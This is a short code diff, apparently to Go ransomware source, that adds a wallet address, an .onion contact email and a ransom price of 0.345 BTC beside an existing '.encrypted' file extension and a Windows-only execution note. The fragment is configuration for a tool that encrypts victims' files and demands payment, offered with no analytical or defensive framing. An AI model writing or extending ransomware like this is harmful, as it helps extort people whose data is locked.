@@ -57,6 +57,15 @@ var (
 
 	// Extension appended to files after encryption
 	EncryptionExtension = ".encrypted"
+
+	// Your wallet address
+	Wallet = "FD0AhH61ona6fXS62RSQKhNF07Ijx5SBQO"
+
+	// Your contact email
+	ContactEmail = "example@ywtpdnpwihbyuvck.onion"
+
+	// The ransom to pay
+	Price = "0.345 BTC"
 )
 
 // Execute only on windows
